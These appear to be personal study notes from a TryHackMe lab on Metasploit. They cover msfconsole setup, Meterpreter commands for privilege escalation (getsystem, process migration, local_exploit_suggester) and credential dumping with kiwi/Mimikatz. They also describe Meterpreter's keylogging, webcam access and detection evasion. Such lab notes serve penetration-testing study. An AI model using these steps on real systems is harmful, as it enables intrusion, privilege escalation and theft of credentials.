Metasploit framework is a set of tools that allows info. gathering,scanning,exploitation,exploit development,post-exploitation and more.
CLI -> msfconsole
Modules: exploits,payloads,scanners...(Core components)
Tools: Standalone tools that help vuln. assessment or pentesting. Eg:msfvenom

CLI -> sudo msfconsole

>options
>set LHOST <kali_ip>
>set RHOSTS <target_ip>
>exploit  or run 
meterpreter > getsystem // Privilege Escalation
ps > list process running on target
migrate <pid>  //Ex:cmd.exe PID=4564

Meterpreter session: Meterpreter shell is essentially an attack platform that gets injected into memory of running process.Thus it avoids detection by HIDS as well as bypassing the limitations of OS's native command shell.
The meterpreter can be used to perform different actions on the machine. 
Eg: Taking SS,get live screen, view webcam and microhone access,record keystrokes,get a shell,privilege escalation

THM Icecast Room:
getuid  -> Find user running the process
sysinfo -> Find build,architecture,OS of Windows is the system

The post/multi/recon/local_exploit_suggester module in Metasploit is used for automatically suggesting potential local privilege escalation exploits on a compromised system. This module works by analyzing the current system's configuration and installed software to identify potential vulnerabilities that can be exploited to escalate privileges.
Now that we know the architecture of the process, let’s perform some further recon. While this doesn’t work the best on x64 machines, let’s now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete*
meterpreter > run post/multi/recon/local_exploit_suggester
meterpreter > bg
use exploit suggested by recon
Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`
...We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?
What permission listed allows us to take ownership of files?    Answer : SeTakeOwnershipPrivilege

migrate <pid> // PID of user(NT AUTHORITY\SYSTEM)
getuid //check user

Now that we’ve made our way to full administrator permissions we’ll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz)

After 'load kiwi'  ....Work only after privilege escalation
help > to look for kiwi commands....creds_all
